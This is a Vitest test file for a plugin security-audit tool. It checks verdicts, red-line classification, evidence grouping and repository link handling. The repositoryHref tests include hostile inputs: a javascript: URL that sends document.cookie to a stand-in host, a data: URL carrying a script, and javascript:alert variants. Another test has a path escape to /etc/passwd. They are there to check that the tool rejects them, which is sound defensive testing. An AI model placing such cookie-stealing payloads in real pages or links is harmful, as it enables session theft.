import { describe, expect, it } from 'vitest'
import {
  classifyRedLine,
  concerns,
  countVerdicts,
  formatInjectionDetail,
  groupEvidence,
  presentInjection,
  repositoryHref,
  topCapabilities,
  verdict,
} from '../../src/core/present.ts'
import type { AuditReport, Capability, Evidence } from '../../src/core/types.ts'

const baseReport = (): AuditReport => ({
  name: 'test-plugin',
  version: '1.0.0',
  spec: 'npm:test@1.0.0',
  capabilities: [],
  evidence: [],
  destinations: [],
  pathEscapes: [],
  secretTouches: [],
  injections: [],
  injectedTokensEstimate: 0,
  hasBuildScript: false,
  buildScripts: [],
  repository: 'https://github.com/x/y',
  pinned: true,
  score: 100,
  band: 'green',
  redLines: [],
  deductions: [],
  summary: 'no red lines · no privileged capabilities · pinned',
})

describe('verdict', () => {
  it('returns red only when redLines is non-empty', () => {
    const report = {
      ...baseReport(),
      score: 9,
      band: 'red' as const,
      capabilities: ['shell', 'network'] as Capability[],
    }
    expect(verdict(report)).toBe('review')
  })

  it('returns review for modlens-like low score without red lines', () => {
    const modlensLike: AuditReport = {
      ...baseReport(),
      name: '@liustack/modlens',
      version: '3.25.1',
      capabilities: ['shell', 'fs-write', 'fs-read', 'network', 'env', 'llm'],
      score: 9,
      band: 'red',
      pinned: false,
      injectedTokensEstimate: 14157,
      injections: [{ kind: 'skill', detail: 'skill ships instruction text skills/modlens/SKILL.md', bytes: 1000 }],
    }
    expect(verdict(modlensLike)).toBe('review')
    expect(concerns(modlensLike)[0]?.code).toBe('shell')
  })

  it('returns red when install script red line is present', () => {
    const report = {
      ...baseReport(),
      redLines: ['runs code at install time (postinstall)'],
      band: 'red' as const,
      score: 49,
    }
    expect(verdict(report)).toBe('red')
  })

  it('returns accepted when red lines are acknowledged', () => {
    const report = {
      ...baseReport(),
      redLines: ['runs code at install time (postinstall)'],
      capabilities: ['shell'] as Capability[],
      band: 'red' as const,
      score: 49,
    }
    const ack = {
      capabilities: ['shell'] as Capability[],
      destinations: [],
      secretTouches: [],
      pathEscapes: [],
      redLines: ['runs code at install time (postinstall)'],
      at: '2026-01-01T00:00:00.000Z',
    }
    expect(verdict(report, ack)).toBe('accepted')
  })

  it('returns review for override injection without capabilities', () => {
    const report = {
      ...baseReport(),
      injections: [{ kind: 'disable' as const, detail: 'disables bundle ui-other', bytes: 0 }],
      score: 90,
      band: 'yellow' as const,
    }
    expect(verdict(report)).toBe('review')
  })

  it('returns clear for a clean plugin', () => {
    expect(verdict(baseReport())).toBe('clear')
  })
})

describe('classifyRedLine', () => {
  it('maps known scanner strings to stable codes', () => {
    expect(classifyRedLine('runs code at install time (prepare)')).toBe('install-script')
    expect(classifyRedLine('tampers with a core bundle (overrides bundle @deepseek-ai/dsh-base)')).toBe('core-tamper')
    expect(classifyRedLine('reads credentials/secrets AND has network access')).toBe('creds-network')
    expect(classifyRedLine('something unknown')).toBe('raw')
  })

  it('maps shape red lines to stable codes', () => {
    expect(classifyRedLine('uses plaintext http:// to evil.test')).toBe('plaintext-http')
    expect(classifyRedLine('uses literal IP 203.0.113.1 for network access')).toBe('literal-ip')
  })
})

describe('concerns', () => {
  it('lists red lines before capabilities and caps at max', () => {
    const report: AuditReport = {
      ...baseReport(),
      redLines: ['runs code at install time (postinstall)'],
      capabilities: ['shell', 'network'],
      band: 'red',
      score: 49,
    }
    const list = concerns(report, 2)
    expect(list).toHaveLength(2)
    expect(list[0]?.code).toBe('install-script')
    expect(list[1]?.code).toBe('shell')
  })

  it('preserves raw red-line detail', () => {
    const report = {
      ...baseReport(),
      redLines: ['custom red line message'],
      band: 'red' as const,
    }
    expect(concerns(report)[0]).toEqual({ code: 'raw', detail: 'custom red line message' })
  })

  it('surfaces path-escape when workspace paths are present', () => {
    const report: AuditReport = {
      ...baseReport(),
      pathEscapes: [{ kind: 'absolute', value: '/etc/passwd', file: 'a.js', line: 1 }],
    }
    expect(concerns(report).some(c => c.code === 'path-escape')).toBe(true)
  })
})

describe('groupEvidence', () => {
  it('groups rows by capability', () => {
    const evidence: Evidence[] = [
      { capability: 'shell', file: 'a.js', line: 1, snippet: 'spawn()' },
      { capability: 'network', file: 'b.js', line: 2, snippet: 'fetch()' },
      { capability: 'shell', file: 'c.js', line: 3, snippet: 'exec()' },
    ]
    const grouped = groupEvidence(evidence)
    expect(grouped.get('shell')).toHaveLength(2)
    expect(grouped.get('network')).toHaveLength(1)
  })
})

describe('topCapabilities', () => {
  it('returns highest-weight capabilities first', () => {
    const report = {
      ...baseReport(),
      capabilities: ['env', 'shell', 'fs-read'] as Capability[],
    }
    expect(topCapabilities(report, 2)).toEqual(['shell', 'fs-read'])
  })
})

describe('formatInjectionDetail', () => {
  it('lists client inject packages', () => {
    expect(formatInjectionDetail('injects client deps: @a/b, @c/d'))
      .toBe('@a/b, @c/d')
  })

  it('strips skill instruction prefix', () => {
    expect(formatInjectionDetail('ships instruction text skills/modlens/SKILL.md'))
      .toBe('skills/modlens/SKILL.md')
  })
})

describe('presentInjection', () => {
  it('parses client deps into packages', () => {
    expect(presentInjection('injects client deps: @deepseek-ai/dsh-client-locale, @x/y')).toEqual({
      summaryKey: 'inj.client-deps',
      packages: ['@deepseek-ai/dsh-client-locale', '@x/y'],
    })
  })
})

describe('countVerdicts', () => {
  it('aggregates verdict counts', () => {
    const reports = [
      { ...baseReport(), redLines: ['runs code at install time (x)'], band: 'red' as const },
      { ...baseReport(), capabilities: ['network'] as Capability[], band: 'yellow' as const },
      baseReport(),
    ]
    expect(countVerdicts(reports)).toEqual({ red: 1, accepted: 0, review: 1, expected: 0, clear: 1 })
  })

  it('returns expected when ack fingerprint matches', () => {
    const report = {
      ...baseReport(),
      capabilities: ['network', 'fs-read'] as Capability[],
      destinations: [{ kind: 'https-host' as const, value: 'api.example.com', file: 'a.js', line: 1 }],
      pathEscapes: [],
      secretTouches: [],
    }
    const ack = {
      capabilities: ['fs-read', 'network'] as Capability[],
      destinations: ['https-host:api.example.com'],
      secretTouches: [],
      pathEscapes: [],
      at: '2026-01-01T00:00:00.000Z',
    }
    expect(verdict(report, ack)).toBe('expected')
  })
})

describe('repositoryHref', () => {
  it('normalises the npm git+https form', () => {
    expect(repositoryHref('git+https://github.com/x/y.git')).toBe('https://github.com/x/y.git')
  })

  it('passes plain http and https through', () => {
    expect(repositoryHref('https://github.com/x/y')).toBe('https://github.com/x/y')
    expect(repositoryHref('http://example.org/x')).toBe('http://example.org/x')
  })

  it('refuses schemes a hostile manifest could use to run code', () => {
    expect(repositoryHref('javascript:fetch("http://evil.test/"+document.cookie)')).toBeUndefined()
    expect(repositoryHref('data:text/html,<script>alert(1)</script>')).toBeUndefined()
    expect(repositoryHref('  javascript:alert(1)')).toBeUndefined()
    expect(repositoryHref('JavaScript:alert(1)')).toBeUndefined()
    expect(repositoryHref('git+javascript:alert(1)')).toBeUndefined()
  })

  it('refuses values that are not URLs at all', () => {
    expect(repositoryHref('x/y')).toBeUndefined()
    expect(repositoryHref(undefined)).toBeUndefined()
  })
})
